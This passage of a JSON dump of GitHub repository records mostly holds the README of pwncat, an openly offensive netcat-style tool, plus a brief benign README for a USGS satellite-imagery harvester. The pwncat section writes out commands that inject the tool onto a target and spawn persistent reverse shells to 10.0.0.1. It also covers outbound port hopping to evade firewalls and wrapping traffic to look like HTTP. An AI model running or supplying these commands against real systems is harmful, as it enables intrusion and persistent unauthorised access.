deploy itself unbreakably on the target - fully automated.\\n\\n<a href=\\\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\\\"><img width=\\\"400\\\" style=\\\"width:400px;\\\" src=\\\"docs/img/video01.png\\\" /></a>\\n\\n> [View on Youtube](https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s)\\n\\nAll you have to do, is use `pwncat` as your local listener and start it with the `--self-inject`\\nswitch. As soon as the client (e.g.: the reverse web shell) connects to it, it will do a couple of things:\\n\\n1. Enumerate Python availability and versions on the target\\n2. Dump itself base64 encoded onto the target\\n3. Use the target's Python to decode itself.\\n4. Use the target's Python to start itself as an unbreakable reverse shell back to you\\n\\nOnce this is done, you can keep using the current connection or simply abandon it and start a new\\nlistener (yes, you don't need to start the listener before starting the reverse shell) to have\\nthe new `pwncat` client connect to you. The new listener also doesn't have to be `pwncat`, it can\\nalso be `netcat` or `ncat`.\\n\\nThe **`--self-inject`** switch:\\n```bash\\npwncat -l 4444 --self-inject <cmd>:<host>:<port>\\n```\\n\\n* `<cmd>`: This is the command to start on the target (like `-e`/`--exec`, so you want it to be `cmd.exe` or `/bin/bash`)\\n* `<host>`: This is for your local machine, the IP address to where the reverse shell shall connect back to\\n* `<port>`: This is for your local machine, the port on which the reverse shell shall connect back to\\n\\nSo imagine your Kali machine is 10.0.0.1. You instruct your webshell that you inject onto a Linux server to connect to you at port `4444`:\\n```bash\\n# Start this locally, before starting the reverse webshell\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445\\n```\\nYou will then see something like this:\\n```\\n[PWNCAT CnC] Probing for: /bin/python\\n[PWNCAT CnC] Probing for: /bin/python2\\n[PWNCAT CnC] Probing for: /bin/python2.7\\n[PWNCAT CnC] Probing for: /bin/python3\\n[PWNCAT CnC] Probing for: /bin/python3.5\\n[PWNCAT CnC] Probing for: /bin/python3.6\\n[PWNCAT CnC] Probing for: /bin/python3.7\\n[PWNCAT CnC] Probing for: /bin/python3.8\\n[PWNCAT CnC] Probing for: /usr/bin/python\\n[PWNCAT CnC] Potential path: /usr/bin/python\\n[PWNCAT CnC] Found valid Python2 version: 2.7.16\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT\\n[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)\\n[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &\\n```\\nAnd you are set. You can now start another listener locally at `4445` (again, it will connect back to you endlessly, so it is not required to start the listener first).\\n```bash\\n# either netcat\\nnc -lp 4445\\n# or ncat\\nncat -l 4445\\n# or pwncat\\npwncat -l 4445\\n```\\n\\n### Unlimited self-injecting reverse shells\\n\\nInstead of just asking for a single self-injecting reverse shell, you can instruct `pwncat` to spawn as many unbreakable reverse shells connecting back to you as you desire.\\n\\n<a href=\\\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\"><img width=\\\"400\\\" style=\\\"width:400px;\\\" src=\\\"docs/img/video02.png\\\" /></a>\\n\\n> [View on Youtube](https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\\\")\\n\\nThe `--self-inject` argument allows you to not only define a single port, but also\\n\\n1. A comma separated list of ports: `4445,4446,4447,4448`\\n2. A range definition: `4446-4448`\\n3. An increment: `4445+3`\\n\\nIn order to spawn 4 reverse shells you would start your listener just as described above, but instead\\nof a single port, you define multiple:\\n\\n```bash\\n# Comma separated\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445,4446,4447,4448\\n\\n# Range\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445-4448\\n\\n# Increment\\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3\\n```\\nEach of the above three commands will achieve the same behaviour: spawning 4 reverse shells inside the target.\\nOnce the client connects, the output will look something like this:\\n\\n```\\n[PWNCAT CnC] Probing for: /bin/python\\n[PWNCAT CnC] Probing for: /bin/python2\\n[PWNCAT CnC] Probing for: /bin/python2.7\\n[PWNCAT CnC] Probing for: /bin/python3\\n[PWNCAT CnC] Probing for: /bin/python3.5\\n[PWNCAT CnC] Probing for: /bin/python3.6\\n[PWNCAT CnC] Probing for: /bin/python3.7\\n[PWNCAT CnC] Probing for: /bin/python3.8\\n[PWNCAT CnC] Probing for: /usr/bin/python\\n[PWNCAT CnC] Potential path: /usr/bin/python\\n[PWNCAT CnC] Found valid Python2 version: 2.7.16\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us\\n[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT\\n[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)\\n[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4446 &\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4447 &\\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4448 &\\n```\\n\\n### Logging\\n\\n> **Note:** Ensure you have a reverse shell that keeps coming back to you. This way you can always change your logging settings without loosing the shell.\\n\\n#### Log level and redirection\\n\\nIf you feel like, you can start a listener in full TRACE logging mode to figure out what's going on or simply to troubleshoot.\\nLog message are colored depending on their severity. Colors are automatically turned off, if stderr is not a pty, e.g.: if piping those to a file.\\nYou can also manually disable colored logging for terminal outputs via the `--color` switch.\\n```bash\\npwncat -vvvv -l 4444\\n```\\nYou will see (among all the gibberish) a TRACE message:\\n```bash\\n2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744\\n2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)\\n2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output\\n```\\n\\nAs soon as you saw this on the listener, you can issue commands to the client.\\nAll the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate\\nyour server and start it again in silent mode:\\n```bash\\npwncat -l 4444\\n```\\nNow wait a maximum a few seconds, depending at what interval the client comes back to you and voila, your session is now again without logs.\\n\\nHaving no info messages at all, is also sometimes not desirable. You might want to know what is going\\non behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect\\nthe notifications to a logfile:\\n```bash\\npwncat -l -vvv 4444 2> comm.txt\\n```\\nNow all you'll see in your terminal session are the actual command inputs and outputs.\\nIf you want to see what's going on behind the scene, open a second terminal window and tail\\nthe `comm.txt` file:\\n```bash\\n# View communication info\\ntail -fn50 comm.txt\\n\\n2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744\\n2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\\\\x1b[32m[0]\\\\x1b[0m\\\\r\\\\r\\\\n'\\n2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)\\n2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output\\n```\\n\\n#### Socket information\\n\\nAnother useful feature is to display currently configured socket and network settings.\\nUse the `--info` switch with either `socket`, `ipv4`, `ipv6`, `tcp` or `all` to display all\\navailable settings.\\n\\n**Note:** In order to view those settings, you must at least be at `INFO` log level (`-vv`).\\n\\nAn example output in IPv4/TCP mode without any custom settings is shown below:\\n```\\nINFO: [bind-sock] Sock: SO_DEBUG: 0\\nINFO: [bind-sock] Sock: SO_ACCEPTCONN: 1\\nINFO: [bind-sock] Sock: SO_REUSEADDR: 1\\nINFO: [bind-sock] Sock: SO_KEEPALIVE: 0\\nINFO: [bind-sock] Sock: SO_DONTROUTE: 0\\nINFO: [bind-sock] Sock: SO_BROADCAST: 0\\nINFO: [bind-sock] Sock: SO_LINGER: 0\\nINFO: [bind-sock] Sock: SO_OOBINLINE: 0\\nINFO: [bind-sock] Sock: SO_REUSEPORT: 0\\nINFO: [bind-sock] Sock: SO_SNDBUF: 16384\\nINFO: [bind-sock] Sock: SO_RCVBUF: 131072\\nINFO: [bind-sock] Sock: SO_SNDLOWAT: 1\\nINFO: [bind-sock] Sock: SO_RCVLOWAT: 1\\nINFO: [bind-sock] Sock: SO_SNDTIMEO: 0\\nINFO: [bind-sock] Sock: SO_RCVTIMEO: 0\\nINFO: [bind-sock] Sock: SO_ERROR: 0\\nINFO: [bind-sock] Sock: SO_TYPE: 1\\nINFO: [bind-sock] Sock: SO_PASSCRED: 0\\nINFO: [bind-sock] Sock: SO_PEERCRED: 0\\nINFO: [bind-sock] Sock: SO_BINDTODEVICE: 0\\nINFO: [bind-sock] Sock: SO_PRIORITY: 0\\nINFO: [bind-sock] Sock: SO_MARK: 0\\nINFO: [bind-sock] IPv4: IP_OPTIONS: 0\\nINFO: [bind-sock] IPv4: IP_HDRINCL: 0\\nINFO: [bind-sock] IPv4: IP_TOS: 0\\nINFO: [bind-sock] IPv4: IP_TTL: 64\\nINFO: [bind-sock] IPv4: IP_RECVOPTS: 0\\nINFO: [bind-sock] IPv4: IP_RECVRETOPTS: 0\\nINFO: [bind-sock] IPv4: IP_RETOPTS: 0\\nINFO: [bind-sock] IPv4: IP_MULTICAST_IF: 0\\nINFO: [bind-sock] IPv4: IP_MULTICAST_TTL: 1\\nINFO: [bind-sock] IPv4: IP_MULTICAST_LOOP: 1\\nINFO: [bind-sock] IPv4: IP_DEFAULT_MULTICAST_TTL: 0\\nINFO: [bind-sock] IPv4: IP_DEFAULT_MULTICAST_LOOP: 0\\nINFO: [bind-sock] IPv4: IP_MAX_MEMBERSHIPS: 0\\nINFO: [bind-sock] IPv4: IP_TRANSPARENT: 0\\nINFO: [bind-sock] TCP: TCP_NODELAY: 0\\nINFO: [bind-sock] TCP: TCP_MAXSEG: 536\\nINFO: [bind-sock] TCP: TCP_CORK: 0\\nINFO: [bind-sock] TCP: TCP_KEEPIDLE: 7200\\nINFO: [bind-sock] TCP: TCP_KEEPINTVL: 75\\nINFO: [bind-sock] TCP: TCP_KEEPCNT: 9\\nINFO: [bind-sock] TCP: TCP_SYNCNT: 6\\nINFO: [bind-sock] TCP: TCP_LINGER2: 60\\nINFO: [bind-sock] TCP: TCP_DEFER_ACCEPT: 0\\nINFO: [bind-sock] TCP: TCP_WINDOW_CLAMP: 0\\nINFO: [bind-sock] TCP: TCP_INFO: 10\\nINFO: [bind-sock] TCP: TCP_QUICKACK: 1\\nINFO: [bind-sock] TCP: TCP_FASTOPEN: 0\\n```\\n\\n\\n<!--\\n</details>\\n-->\\n\\n### Port forwarding magic\\n\\n<!--\\n<details>\\n <summary>Click to expand</summary>\\n-->\\n\\n#### Local TCP port forwarding\\n\\n**Scenario**\\n1. Alice can be reached from the Outside (TCP/UDP)\\n2. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ TCP +-----------------+ TCP +-----------------+\\n | The cat | -----|----> | Alice | -----|----> | Bob |\\n | | | | pwncat | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat 72.0.0.1 3306 | pwncat \\\\ |\\n | -L 72.0.0.1:3306 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n\\n#### Local UDP port forwarding\\n\\n**Scenario**\\n1. Alice can be reached from the Outside (but only via UDP)\\n2. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ UDP +-----------------+ TCP +-----------------+\\n | The cat | -----|----> | Alice | -----|----> | Bob |\\n | | | | pwncat -L | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat -u 72.0.0.1 3306 | pwncat -u \\\\ |\\n | -L 72.0.0.1:3306 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n\\n#### Remote TCP port forward\\n\\n**Scenario**\\n1. Alice cannot be reached from the Outside\\n2. Alice is allowed to connect to the Outside (TCP/UDP)\\n3. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ TCP +-----------------+ TCP +-----------------+\\n | The cat | <----|----- | Alice | -----|----> | Bob |\\n | | | | pwncat | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat -l 4444 | pwncat --reconn \\\\ |\\n | -R 56.0.0.1:4444 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n\\n#### Remote UDP port forward\\n\\n**Scenario**\\n1. Alice cannot be reached from the Outside\\n2. Alice is allowed to connect to the Outside (UDP: DNS only)\\n3. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ UDP +-----------------+ TCP +-----------------+\\n | The cat | <----|----- | Alice | -----|----> | Bob |\\n | | | | pwncat | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat -u -l 53 | pwncat -u --reconn \\\\ |\\n | -R 56.0.0.1:4444 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n<!--\\n</details>\\n-->\\n\\n\\n### Outbound port hopping\\n\\nIf you have no idea what outbound ports are allowed from the target machine, you can instruct\\nthe client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.\\n\\n```bash\\n# Reverse shell on target (the client)\\n# --exec # The command shell the client should provide\\n# --reconn # Instruct it to reconnect endlessly\\n# --reconn-wait # Reconnect every 0.1 seconds\\n# --reconn-robin # Use these ports to probe for outbount connections\\n\\npwncat --exec /bin/bash --reconn --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53\\n```\\n\\nOnce the client is up and running, either use raw sockets to check for inbound traffic or use\\nsomething like Wireshark or tcpdump to find out from where the client is able to connect back to you,\\n\\nIf you found one or more ports that the client is able to connect to you,\\nsimply start your listener locally and wait for it to come back.\\n```bash\\npwncat -l <ip> <port>\\n```\\nIf the client connects to you, you will have a working reverse shell. If you stop your local\\nlistening server accidentally or on purpose, the client will probe ports again until it connects successfully.\\nIn order to kill the reverse shell client, you can use `--safe-word` (when starting the client).\\n\\n\\nIf none of this succeeds, you can add other measures such as using UDP or even wrapping your\\npackets into higher level protocols, such as HTTP or others. See [PSE](pse) or examples below\\nfor how to transform your traffic.\\n\\n\\n### Pwncat Scripting Engine ([PSE](pse))\\n\\n`pwncat` offers a Python based scripting engine to inject your custom code before sending and\\nafter receiving data.\\n\\n#### How it works\\n\\nYou will simply need to provide a Python file with the following entrypoint function:\\n```python\\ndef transform(data, pse):\\n # Example to reverse a string\\n return data[::-1]\\n```\\nBoth, the function name must be named `transform` and the parsed arguments must be named `data` and `pse`.\\nOther than that you can add as much code as you like. Each instance of `pwncat` can take two scripts:\\n\\n1. `--script-send`: script will be applied before sending\\n2. `--script-recv`: script will be applied after receiving\\n\\nSee [here](pse) for API and more details\\n\\n\\n#### Example 1: Self-built asymmetric encryption\\n\\n> PSE: [asym-enc](pse/asym-enc) source code\\n\\nThis will encrypt your traffic asymmetrically. It is just a very basic [ROT13](https://en.wikipedia.org/wiki/ROT13) implementation with different shift lengths on both sides to *emulate* asymmetry. You could do the same and implement GPG based asymmetric encryption for PSE.\\n\\n```bash\\n# server\\npwncat -vvvv -l localhost 4444 \\\\\\n --script-send pse/asym-enc/pse-asym_enc-server_send.py \\\\\\n --script-recv pse/asym-enc/pse-asym_enc-server_recv.py\\n```\\n```bash\\n# client\\npwncat -vvvv localhost 4444 \\\\\\n --script-send pse/asym-enc/pse-asym_enc-client_send.py \\\\\\n --script-recv pse/asym-enc/pse-asym_enc-client_recv.py\\n```\\n\\n#### Example 2: Self-built HTTP POST wrapper\\n\\n> PSE: [http-post](pse/http-post) source code\\n\\nThis will wrap all traffic into a valid HTTP POST request, making it look like normal HTTP traffic.\\n\\n```bash\\n# server\\npwncat -vvvv -l localhost 4444 \\\\\\n --script-send pse/http-post/pse-http_post-pack.py \\\\\\n --script-recv pse/http-post/pse-http_post-unpack.py\\n```\\n```bash\\n# client\\npwncat -vvvv localhost 4444 \\\\\\n --script-send pse/http-post/pse-http_post-pack.py \\\\\\n --script-recv pse/http-post/pse-http_post-unpack.py\\n```\\n\\n### Port scanning\\n\\n#### TCP\\n```bash\\n$ sudo netstat -tlpn\\nActive Internet connections (only servers)\\nProto Recv-Q Send-Q Local Address Foreign Address State\\ntcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN\\ntcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN\\ntcp 0 0 127.0.0.1:4444 0.0.0.0:* LISTEN\\ntcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN\\ntcp6 0 0 ::1:631 :::* LISTEN\\ntcp6 0 0 ::1:25 :::* LISTEN\\ntcp6 0 0 ::1:4444 :::* LISTEN\\ntcp6 0 0 :::1053 :::* LISTEN\\ntcp6 0 0 :::902 :::* LISTEN\\n```\\n\\n#### UDP\\nThe following UDP ports are exposing:\\n```bash\\n$ sudo netstat -ulpn\\nActive Internet connections (only servers)\\nProto Recv-Q Send-Q Local Address Foreign Address\\nudp 0 0 0.0.0.0:631 0.0.0.0:*\\nudp 0 0 0.0.0.0:5353 0.0.0.0:*\\nudp 0 0 0.0.0.0:39856 0.0.0.0:*\\nudp 0 0 0.0.0.0:68 0.0.0.0:*\\nudp 0 0 0.0.0.0:68 0.0.0.0:*\\nudp6 0 0 :::1053 :::*\\nudp6 0 0 :::5353 :::*\\nudp6 0 0 :::57728 :::*\\n```\\n\\n##### nmap\\n```bash\\n$ time sudo nmap -T5 localhost --version-intensity 0 -p- -sU\\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 17:03 CEST\\nWarning: 127.0.0.1 giving up on port because retransmission cap hit (2).\\nNmap scan report for localhost (127.0.0.1)\\nHost is up (0.000035s latency).\\nOther addresses for localhost (not scanned): ::1\\nNot shown: 65529 closed ports\\nPORT STATE SERVICE\\n68/udp open|filtered dhcpc\\n631/udp open|filtered ipp\\n1053/udp open|filtered remote-as\\n5353/udp open|filtered zeroconf\\n39856/udp open|filtered unknown\\n40488/udp open|filtered unknown\\n\\nNmap done: 1 IP address (1 host up) scanned in 179.15 seconds\\n\\nreal 2m52.446s\\nuser 0m0.844s\\nsys 0m2.571s\\n```\\n##### netcat\\n```bash\\n$ time nc -z localhost 1-65535 -u -4 -v\\nConnection to localhost 68 port [udp/bootpc] succeeded!\\nConnection to localhost 631 port [udp/ipp] succeeded!\\nConnection to localhost 1053 port [udp/*] succeeded!\\nConnection to localhost 5353 port [udp/mdns] succeeded!\\nConnection to localhost 39856 port [udp/*] succeeded!\\n\\nreal 0m18.734s\\nuser 0m1.004s\\nsys 0m2.634s\\n```\\n##### pwncat\\n```bash\\n$ time pwncat -z localhost 1-65535 -u -4\\nScanning 65535 ports\\n[+] 68/UDP open (IPv4)\\n[+] 631/UDP open (IPv4)\\n[+] 1053/UDP open (IPv4)\\n[+] 5353/UDP open (IPv4)\\n[+] 39856/UDP open (IPv4)\\n\\nreal 0m7.309s\\nuser 0m6.465s\\nsys 0m4.794s\\n```\\n\\n\\n## :information_source: FAQ\\n\\n**Q**: Is `pwncat` compatible with `netcat`?\\n\\n**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.\\nYou can even mix `pwncat` with `netcat`, `ncat` or similar tools.\\n\\n\\n**Q**: Does it work on X?\\n\\n**A**: In its current state it works with Python 2, 3 pypy2 and pypy3 and is fully tested on Linux and MacOS. Windows support is available, but is considered experimental (see [integration tests](https://github.com/cytopia/pwncat/actions)).\\n\\n\\n**Q**: I found a bug / I have to suggest a new feature! What can I do?\\n\\n**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).\\n\\n\\n**Q**: How can I support this project?\\n\\n**A**: Thanks for asking! First of all, star this project to give me some feedback and see [CONTRIBUTING.md](CONTRIBUTING.md) for details.\\n\\n\\n## :sunrise: Artwork\\n\\n<table>\\n <thead>\\n <tr>\\n <th>Type</th>\\n <th>Artist</th>\\n <th>Image</th>\\n <th>License</th>\\n </tr>\\n </thead>\\n <tbody>\\n <tr>\\n <td>Logo</td>\\n <td><a href=\\\"https://github.com/maifz\\\">maifz</a></td>\\n <td><a href=\\\"art/logo.png\\\"><img src=\\\"art/logo.png\\\" style=\\\"height:128px;\\\" height=\\\"128\\\" alt=\\\"pwncat logo\\\" title=\\\"pwncat logo\\\" /></a></td>\\n <td><a href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"><img src=\\\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\\\" /></a></td>\\n </tr>\\n <tr>\\n <td>Banner 1</td>\\n <td><a href=\\\"https://github.com/maifz\\\">maifz</a></td>\\n <td><a href=\\\"art/banner-1.png\\\"><img src=\\\"art/banner-1.png\\\" style=\\\"height:128px;\\\" height=\\\"128\\\" alt=\\\"pwncat banner\\\" title=\\\"pwncat banner\\\" /></a></td>\\n <td><a href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"><img src=\\\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\\\" /></a></td>\\n </tr>\\n <tr>\\n <td>Banner 2</td>\\n <td><a href=\\\"https://github.com/maifz\\\">maifz</a></td>\\n <td><a href=\\\"art/banner-2.png\\\"><img src=\\\"art/banner-2.png\\\" style=\\\"height:128px;\\\" height=\\\"128\\\" alt=\\\"pwncat banner\\\" title=\\\"pwncat banner\\\" /></a></td>\\n <td><a href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"><img src=\\\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\\\" /></a></td>\\n </tr>\\n </tbody>\\n</table>\\n\\n\\n## :lock: [cytopia](https://github.com/cytopia) sec tools\\n\\nBelow is a list of sec tools and docs I am maintaining.\\n\\n| Name | Category | Language | Description |\\n|----------------------|----------------------|------------|-------------|\\n| **[offsec]** | Documentation | Markdown | Offsec checklist, tools and examples |\\n| **[header-fuzz]** | Enumeration | Bash | Fuzz HTTP headers |\\n| **[smtp-user-enum]** | Enumeration | Python 2+3 | SMTP users enumerator |\\n| **[urlbuster]** | Enumeration | Python 2+3 | Mutable web directory fuzzer |\\n| **[pwncat]** | Pivoting | Python 2+3 | Cross-platform netcat on steroids |\\n| **[badchars]** | Reverse Engineering | Python 2+3 | Badchar generator |\\n| **[fuzza]** | Reverse Engineering | Python 2+3 | TCP fuzzing tool |\\n\\n[offsec]: https://github.com/cytopia/offsec\\n[header-fuzz]: https://github.com/cytopia/header-fuzz\\n[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum\\n[urlbuster]: https://github.com/cytopia/urlbuster\\n[pwncat]: https://github.com/cytopia/pwncat\\n[badchars]: https://github.com/cytopia/badchars\\n[fuzza]: https://github.com/cytopia/fuzza\\n\\n\\n## :octocat: Contributing\\n\\nSee **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.\\n\\n\\n## :exclamation: Disclaimer\\n\\nThis tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.\\n\\n\\n## :page_facing_up: License\\n\\n**[MIT License](LICENSE.txt)**\\n\\nCopyright (c) 2020 **[cytopia](https://github.com/cytopia)**\\n\"", "topics": ["nc", "netcat", "offensive", "portforward", "pivoting", "ncat"], "writeup": "", "ignoredescription": false, "id": 17, "full_name": "cytopia/pwncat", "url": "https://github.com/cytopia/pwncat", "topic_string": "nc netcat offensive portforward pivoting ncat"},
{"tags": [], "owner": "datalogistics", "description": "", "name": "eodn-harvester", "topics_string": "", "language": "Python", "readme": "\"\\n# About\\n\\nEODNHarvester is a daemon that gathers scenes from the United States Geological Survey (USGS) using the USGS JSON interface. The USGS hosts satellite imagery collected by a number of sensors. These images (a collection of images of a single location - e.g. Standard and Infared - is called a scene) are uploaded to the Earth Observation Depot Network (EODN) for use and data collection.\\n\\n# Installation\\n\\nEODNHarvester is a python script and can be installed using the `setup.py` script. This requires Python3.x.\\n\\n## Prerequisites\\n\\nEnsure your system has python3.x installed.\\n\\n python3 -V\\n\\nIf python3 is not installed, the process will depend on your OS.\\n\\nNOTE: Python3 must be installed as a alternate version of Python on RedHat (and RedHat derived distributions) as yum requires Python2 to be the primary python version.\\n\\n## EODNHarvester\\n\\nEODNHarvester can be installed simply by calling the `setup.py` script.\\n\\n ./setup.py build\\n\\nThen again to install:\\n\\n ./setup.py install\\n\\nIf necessary, a prefix can be provided to install to an explicit bin folder. The following will install eodnharvester to the /usr/local/bin folder:\\n\\n ./setup.py install --prefix=/usr/local\\n\\n\\n# Usage\\n\\nEODNHarvester is designed to be a mostly self sufficient daemon, and can be run simply by calling:\\n\\n eodnharvesterd\\n\\nIf this does not work, ensure that the EODNHarvester has been installed to a directory in your path. For debugging purposes, two flags are available:\\n\\n eodnharvesterd -v\\n\\nand\\n\\n eodnharvesterd -D\\n\\nThe former will output more verbose messages, while the latter will output more robust debugging logging.\\n\\nBy default, the EODNHarvester runs as a standard script, by passing the `-d` flag, it will run as a daemon.\\n\\n eodnharvesterd -d\\n\\nTo set up a new configuration for EODNHarvester, run with the -c flag and follow the instructions in the interface.\\n\\n eodnharvesterd -c\\n\\n\\n## Settings\\n\\nEODNHarvester also includes a large number of settings in the `eodnharvester/settings.py' file. These settings will not take effect unless the project is re-built and re-installed.\\n\\n VERBOSE | This is an override for the -v flag.\\n | If set to true will always emit verbose messages.\\n DEBUG | Same as above for the -D flag.\\n THREADS | Sets the number of threads for the script to use.\\n MAX_RECONNECT | The number of times the EODNHarvester will attempt\\n | to contact USGS before sleeping.\\n HARVEST_WINDOW | How often the EODNHarvester will collect scenes.\\n WORKSPACE | The directory to store the files currently being harvested.\\n | These files are temporary and removed on harvest completion.\\n USGS_HOST | The url used to contact the USGS.\\n USERNAME | The username used to log in to USGS.\\n PASSWORD | The password used to log in to USGS.\\n TIMEOUT | The amount of time to wait before retrying network connections.\\n DATASET_NAME | The USGS satellite being collected from.\\n LOWER_LEFT | The latitude and longitude coordinates of the lower left\\n | corner of the harvested area.\\n UPPER_RIGHT | The latitude and longitude coordinates of the upper right\\n | corner of the harvested area.\\n MAX_RESULTS | The number of scenes harvested in a single pass\\n | (Timeouts occur more often above 15 results)\\n SORT_ORDER | The order to recieve results from USGS in.\\n NODE | The type of data being recieved from USGS.\\n UNIS_HOST | The url or ip of the UNIS instance used to store exnode information.\\n UNIS_PORT | The port number of the UNIS instance used to store exnode information.\\n LoRS | Settings for the LoRS upload. (Read the LoRS documentation\\n | for more info on these settings).\\n REPORT_HOUR | What hour of the day the periodic report should be sent out.\\n REPORT_EMAIL | The email to send reports to.\\n AUTH_FIELD | Where to store security information in the exnode.\\n AUTH_VALUE | The token used for the exnode.\\n\\n VALIDATION_GRANULARITY | Size of chunks to be used when checking\\n | files for correctness.\\n DOWNLOAD_CHUNKSIZE | Chunk size to use when downloading data from USGS.\"", "topics": ["gis", "usgs"], "writeup": "EODNHarvester is a daemon that gathers scenes from the United States Geological Survey (USGS) using the USGS JSON interface. The USGS hosts satellite imagery collected by a number of sensors. These images (a collection of images of a single location - e.g. Standard and Infared - is called a scene) are uploaded to the Earth Observation Depot Network (EODN) for use and data collection.\n", "ignoredescription": false, "id": 18, "full_name": "datalogistics/eodn-harvester", "url": "https://github.com/datalogistics/eodn-harvester", "topic_string": "gis usgs"},
